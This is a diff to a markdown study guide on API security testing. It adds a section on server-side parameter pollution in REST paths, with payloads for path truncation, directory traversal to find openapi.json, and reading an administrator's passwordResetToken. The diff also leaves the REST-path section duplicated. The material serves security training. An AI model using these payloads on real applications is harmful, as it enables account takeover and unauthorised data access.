@@ -8,9 +8,10 @@
 3. [Mass Assignment](#mass-assignment)
 4. [Testing for Server-Side Parameter Pollution (SSPP)](#testing-for-server-side-parameter-pollution-sspp)
    - 4.1. [Testing the Query String 🔴](#testing-the-query-string)
-   - 4.2. [Overriding Existing Parameters](#overriding-existing-parameters)
-   - 4.3. [Testing in REST Paths](#testing-in-rest-paths)
-   - 4.4. [Testing in Structured Data Formats](#testing-in-structured-data-formats)
+   - 4.2. [Testing in REST Paths 🔴](testing-in-rest-paths)
+   - 4.3. [Overriding Existing Parameters](#overriding-existing-parameters)
+   - 4.4. [Testing in REST Paths](#testing-in-rest-paths)
+   - 4.5. [Testing in Structured Data Formats](#testing-in-structured-data-formats)
 5. [Examples and Techniques](#examples-and-techniques)
    - 5.1. [Truncating Query Strings](#truncating-query-strings)
    - 5.2. [Injecting Invalid Parameters](#injecting-invalid-parameters)
@@ -382,7 +383,83 @@ The interesting behavior occurs when the application **decodes your input and us
 
 [![Watch Video](https://img.youtube.com/vi/JMsZ6eg3nkU/maxresdefault.jpg)](https://www.youtube.com/watch?v=JMsZ6eg3nkU)
 
-### 4.2. Overriding Existing Parameters
+### 4.2. Testing in REST Paths
+
+Test whether user input is inserted into a **server-side URL path**.
+
+#### `#` / `?` — Detect Path Injection
+
+```text
+username=administrator%23
+username=administrator%3F
+```
+
+➡️ `#` and `?` can truncate the URL path.
+
+**Indicator:** `Invalid route`
+
+---
+
+#### `./` and `../` — Path Traversal
+
+```text
+username=./administrator
+username=../administrator
+```
+
+➡️ `./` may access the same path, while `../` moves up one directory.
+
+**Indicator:** Different response or `Invalid route`
+
+---
+
+#### Discover API Definition
+
+Use traversal to reach the API root:
+
+```text
+username=../../../../%23
+```
+
+Then test API definition files:
+
+```text
+username=../../../../openapi.json%23
+```
+
+➡️ May reveal internal endpoints such as:
+
+```text
+/api/internal/v1/users/{username}/field/{field}
+```
+
+---
+
+#### Inject Valid Path Parameters
+
+Use the discovered endpoint structure:
+
+```text
+username=administrator/field/email%23
+```
+
+➡️ Test whether `email` is accepted as the `field` value.
+
+---
+
+#### API Version Manipulation
+
+If another API version exists, try changing the version:
+
+```text
+username=../../v1/users/administrator/field/passwordResetToken%23
+```
+
+➡️ May access parameters or functionality unavailable in the application's normal API version.
+
+**Key idea:** User input → server-side URL path → path manipulation → internal API discovery/manipulation.
+
+### 4.3. Overriding Existing Parameters
 - Try injecting duplicate parameters to see which one the server processes:
    ```
    name=attacker&name=originalUser
@@ -392,7 +469,7 @@ The interesting behavior occurs when the application **decodes your input and us
    - **ASP.NET:** Concatenates the parameters.
    - **Node.js/Express/Apache Tomcat:** Uses the first parameter.
      
-### 4.3. Testing in REST Paths
+### 4.4. Testing in REST Paths
 - Test RESTful APIs by manipulating URL path parameters.
 - Use path traversal sequences:
    ```
@@ -403,7 +480,7 @@ The interesting behavior occurs when the application **decodes your input and us
    /../../../../openapi.json
    ```
 
-### 4.4. Testing in Structured Data Formats
+### 4.5. Testing in Structured Data Formats
 - Test requests containing structured data formats (e.g., JSON, XML).
 - Inject parameters directly into JSON requests:
    ```json
